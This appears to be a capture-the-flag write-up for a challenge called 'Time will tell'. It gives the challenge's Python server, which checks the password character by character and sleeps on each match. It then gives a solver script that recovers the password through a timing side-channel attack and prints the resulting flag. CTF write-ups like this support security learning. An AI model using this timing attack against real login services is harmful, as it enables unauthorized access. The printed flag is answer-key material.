# 2024-10-23 Time will tell (Miscellaneous)

*[image unavailable]*

*[image unavailable]*

app.py

```python
#!/usr/bin/env python
# pylint: disable=C0200
"""
side-channel timing attack
"""

import os
import secrets
import time

# Length of password. Can be tuned if folks are solving it quickly
PASSWORD_LEN = 4
# Length of time to sleep when guess entry is correct. "simulates compute time "
SIMULATE_COMPUTE_TIME = 0.1


def generate_password() -> str:
    """
    generate a random password at start up
    """
    tmp = secrets.token_hex(PASSWORD_LEN).lower()
    # with open("dump", 'w') as fh:
    #     fh.write(tmp)
    return tmp


def read_flag() -> str:
    """
    read flag from file on disk
    """
    with open("flag", "r", encoding="ascii") as file_handle:
        data = file_handle.read()
    return data


def do_heavy_compute() -> None:
    """
    simulates some compute
    """
    time.sleep(SIMULATE_COMPUTE_TIME)


def check_guess(guess, realdeal) -> bool:
    """
    validate if the given guess matches what's known
    """
    if len(guess) != len(realdeal):
        #print(len(guess), len(realdeal))
        return False
    do_heavy_compute()
    for idx in range(len(guess)):
        if guess[idx] == realdeal[idx]:
            do_heavy_compute()
        else:
            return False
    return True


def main():
    """
    le big mac
    """
    timeout = os.getenv("CHALL_TIMEOUT")
    # Create random password
    secret_password = generate_password()
    print("Figure out the password to get the flag.")
    print("The password is dynamic and changes every connection session.")
    print(f"The connection will terminate in {timeout} seconds.")

    while True:
        guess = input(": ")
        if check_guess(guess, secret_password):
            flag = read_flag()
            print(f"Well done! Here's your flag: {flag}")
            continue
        print("Incorrect. Try again.")


if __name__ == "__main__":
    main()
```

Make a script to attack side channel

```python
cat 1ack.py 

#Imports
import socket
import time

# Challenge connection details
HOST = 'challenge.ctf.games'
PORT = 31769
PASSWORD_LEN = 8
CHARSET = '0123456789abcdef'  # Hexadecimal characters

def timing_attack():
    # Connect to the challenge server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        # Receive and print the server's initial message
        welcome_message = s.recv(1024).decode()
        print(welcome_message)

        password = ''
        for i in range(PASSWORD_LEN):
            max_time = 0
            best_char = ''
            for char in CHARSET:
                guess = password + char + '0' * (PASSWORD_LEN - len(password) - 1)  # Fill remaining length with '0's
                start_time = time.time()
                
                # Send the guess
                s.sendall(guess.encode() + b'\n')

                # Wait for the server's response
                response = s.recv(1024).decode()
                elapsed_time = time.time() - start_time

                if elapsed_time > max_time:
                    max_time = elapsed_time
                    best_char = char

            password += best_char
            print(f'Progress: {password}')

        print(f'Final password: {password}')

        # Send the correct password
        s.sendall(password.encode() + b'\n')
        flag_response = s.recv(1024).decode()
        print(flag_response)

if __name__ == "__main__":
    timing_attack()
```

*[image unavailable]*

```python
flag{ab6962e29ed608c0710dbf2910f358d5}
```

*[image unavailable]*
